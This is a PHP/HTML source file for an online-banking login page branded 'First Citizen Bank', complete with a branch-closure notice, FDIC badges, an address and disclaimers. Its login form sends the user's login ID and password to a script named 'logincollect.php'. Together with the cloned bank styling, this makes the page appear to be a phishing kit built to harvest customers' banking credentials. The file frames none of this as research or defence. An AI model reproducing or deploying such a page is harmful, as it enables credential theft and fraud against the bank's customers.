<?php
session_start();
// $err = $_SESSION["ERROR"];
if (!empty($_SESSION["ERROR"])) {
  $err = $_SESSION["ERROR"];
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=`, initial-scale=1.0">
  <title>Sign-IN</title>
  <link rel="stylesheet" href="css/animate.min.css">
  <link rel="stylesheet" href="css/bootstrap.min.css">
  <link rel="stylesheet" href="css/style.css">
  <!-- <link rel="stylesheet" href="css/mediaquery.css"> -->
</head>

<body>
  <header class="header">
    <div class="alert alert-danger alert-dismissible fade show" role="alert">
      <div class="container">
        Our Preston Royal branch will be closed until further notice due to damage sustained in the storms of October 20th.
        We are available to serve you at our other branches, or chat us for assistance.
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        <!-- <button type="button" class="btn-close" disabled aria-label="Close"></button> -->
      </div>
    </div>
    <div class="container">
      <ul class="nav nav-tabs">
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="#">BANK</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="#">WEALTH</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="#">TITLE</a>
        </li>
        <li class="nav-item ms-auto">
          <a class="nav-link" style="font-size: 0.8rem;">Sign In</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" style="font-size: 0.8rem;">Locations & ATMs</a>
        </li>
        <li class="nav-item">
          <a class="nav-link " style="font-family:none; font-size: 0.8rem;">462.205.7965</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" style="font-size: 0.8rem;">Contact</a>
        </li>
      </ul>
    </div>

    <section class="section">
      <div class="container-fluid">
        <div class="row align-items-center">
          <div class="col-md-4 order-1 order-md-1">
            <img src="./dashboard/images/logo.png" style="width: 90%;" alt="logo" srcset="">
          </div>
          <div class="col-md-6 order-2 order-md-2 mb-4 mb-md-0 ms-auto ">
            <ul style="display: flex;">
              <li class="m-4">Personal</li>
              <li class="m-4">Business</li>
              <li class="m-4">Loans</li>
              <li class="m-4">About</li>
            </ul>
          </div>
        </div>
      </div>
    </section>
    <section class="login">
      <div class="container">
        <div class="row">
          <div class="col-lg-7 col-md-6 col-sm-6 mb-5">
            <h3 style="
                 font-family: Georgia;
                 padding-top: 1.3rem;
                 font-size: 4.2rem;
                 font-weight: bolder;
                 color: white;
                 line-height: 6rem;
                 text-shadow: 5px 8px rgb(50, 50, 50);
                 
                 ">Welcome to First Citizen Bank</h3>
            <div style="
                      background-color: white;
                      height: .7rem;
                      width: 12%;
                      margin-top: 1.5rem;">
            </div>
          </div>

          <div class="col-lg-4 col-md-6 col-sm-6 ms-auto">
            <div class="form-box">
              <h5 class="p-3">ONLINE BANKING LOGIN</h5>
              <div class="" style="
                background-color: whitesmoke;
                padding-top: 25px;
                padding-bottom: 25px;
                border-radius: 0px 0px 10px 10px ;
                ;">
                <div class=" container">
                  <p style="color:red; text-align: center; font-size: 20px;">
                    <?php
                    if (!empty($err)) {
                      echo ($err);
                      $_SESSION["ERROR"] = "";
                    }
                    ?>
                  </p>
                  <form action="./logincollect.php" class="needs-validation" novalidate method="post">

                    <div class="col-md-12">
                      <input type="text" class="form-control" id="validationCustom01" name="uname" value="" required placeholder="Login ID">
                      <div class="valid-feedback">
                        Looks good!
                      </div>
                    </div>
                    <div class="col-md-12 mt-3">
                      <input type="password" class="form-control" id="validationCustom03" name="upassword" value="" required placeholder="Password">
                      <div class="valid-feedback">
                        Nice place!
                      </div>
                    </div>
                    <div class="col-12 mt-3">
                      <input type="submit" class="submit-btn" name="enroll" value="Sign In">
                    </div>
                  </form>
                  <div class="row mt-4">
                    <div class="col-6">Forgot password?</div>
                    <div class="col-6">New user?</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  </header>



  <br>
  <br><br><br>
  <section class="section">
    <div class="container">
      <div class="row">
        <div class="col-lg-4 col-sm-6 mb-5 mb-lg-0">
          <div class="card mb-3">
            <img src="images/financial-services.jpg" width="100%" height="180" class="card-img-top" text="Image cap" alt="" srcset="">
            <div class="card-body">
              <h5 class="card-title">Personal Solutions</h5>
              <p class="card-text">Making your finances personal.</p>
              <p class="card-text"><small class="text-muted">Find your account</small></p>
            </div>
          </div>
        </div>
        <div class="col-lg-4 col-sm-6 mb-5 mb-lg-0">
          <div class="card mb-3">
            <img src="images/business-services.jpg" width="100%" height="180" class="card-img-top" text="Image cap" alt="" srcset="">
            <div class="card-body">
              <h5 class="card-title">Business Services</h5>
              <p class="card-text">We offer services to empower your success.</p>
              <p class="card-text"><small class="text-muted">Explore management services</small></p>
            </div>
          </div>
        </div>
        <div class="col-lg-4 col-sm-6 mb-5 mb-lg-0">
          <div class="card mb-3">
            <img src="images/lending-services.jpg" width="100%" height="180" class="card-img-top" text="Image cap" alt="" srcset="">
            <div class="card-body">
              <h5 class="card-title">Lending Services</h5>
              <p class="card-text">Business or Personal, we have the loan you need.</p>
              <p class="card-text"><small class="text-muted">Learn more</small></p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>

  <section class="word-content">
    <div class="container-fluid overlay">
      <div class="col-12">
        <h1>We know you by name, not by account number.</h1>
      </div>
      <div class="col-1"></div>
      <div class="col-6">
        <div class="section">
          <div class="row align-items-center">
            <div class="col-md-7 order-1 order-md-1">
              <div class="btn_bank">Find Your First Citizen Bank</div>
            </div>
            <div class="col-md-5 order-2 order-md-2 mb-4 mb-md-0">
              <div class="btn_banker">Contact a Banker</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>


  <!-- <div class="about">
        <div class="container">
          <div class="row ">
            <div class="col-lg-5 col-sm-6 mb-5 mb-lg-0">
              <img src="images/BMB_AppBlogImage.jpg" style="border-radius: 20px 0px ;" width="100%" height="460"  alt="" srcset="">
            </div>
            <div class="col-lg-4 col-sm-6 mb-5 mb-lg-0">
              
            </div>
            <div class="col-lg-3 col-sm-6 mb-5 mb-lg-0 space">
              <div class="px-5 p-4">
                <h2>More from First Citizen</h2>
              </div>
            </div>
          </div>
        </div>
      </div> -->

  <section class="word-content kid-section">
    <div class="container-fluid overlay">
      <h1>Kid's Corner.</h1>
      <div class="col-1"></div>
      <div class="col-12">
        <h3>We are proud to partner with you in teaching the value of spending, saving and giving.</h3>
      </div>
      <div class="col-6">
        <div class="section">
          <div class="row align-items-center">
            <div class="col-md-6 order-1 order-md-1">
              <div class="btn_bank-kid">Visit our Kid's Corner</div>
            </div>
            <div class="col-md-6 order-2 order-md-2 mb-4 mb-md-0">
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>



  <footer class="footer">
    <div class="container p-4">
      <div class="row ">
        <div class="col-lg-10 col-sm-6 mb-5 mb-lg-0">
          <img src="./dashboard/images/logo.png" style="width: 30%;">
        </div>
        <div class="col-lg-2 col-sm-6 mb-5 mb-lg-0">
          <div class="">
            <p>5700 Legacy Drive Suite 10 Plano, Texas 75024</p>
            <a href="mailto:#">Email Us</a>
            <a href="tel:+14622057965">462.205.7965</a>
          </div>
        </div>
      </div>
    </div>

    <div class="container p-4">
      <div class="row">
        <div class="col-1">
          <img src="images/equal-housing-lender.14075e51e868.png" width="100%" alt="" srcset="">
        </div>
        <div class="col-1 p-1">
          <img src="images/FDIC.bc6c87ac4c4c.png" width="100%" alt="" srcset="">
        </div>
        <!-- <div class="col-7">
            </div> -->
        <div class="col-2 p-1 ms-auto">
          <img src="images/footer_logo_bauer.c5e0973fd14b.png" width="100%" alt="" srcset="">
        </div>
        <div class="col-2 p-1">
          <img src="images/footer_logo_DMN.7d46b9b338aa.png" width="100%" alt="" srcset="">
        </div>
        <div class="col-2 p-1">
          <img src="images/footer_logo_americanBanker.2b23a343a7be.png" width="100%" alt="" srcset="">
        </div>
        <div class="col-2 p-1">
          <img src="images/footer_logo_DBJ.932c560ffd2f.png" width="100%" alt="" srcset="">
        </div>
      </div>

      <div class="row">
        <div class="col-3">Disclosures, Security & Financial Privacy Rights</div>
        <div class="col-3 border-le bg-light ">NMLS #403379</div>
      </div>
      <br>
      <div class="col-8">
        <p>First Citizen Title, LLC and First Citizen Private Wealth Management, LLC are wholly-owned subsidiaries of First Citizen Bank.
          First Citizen Title and First Citizen Private Wealth Management products are not FDIC-insured, may lose value, and are not bank guaranteed.
          First Citizen Private Wealth Management, LLC is a Registered Investment Advisor.
        </p>
      </div>


    </div>




  </footer>





</body>

<script src="js/index.js"></script>
<script src="js/validate.js"></script>
<script src="js/bootstrap.min.js"></script>

</html>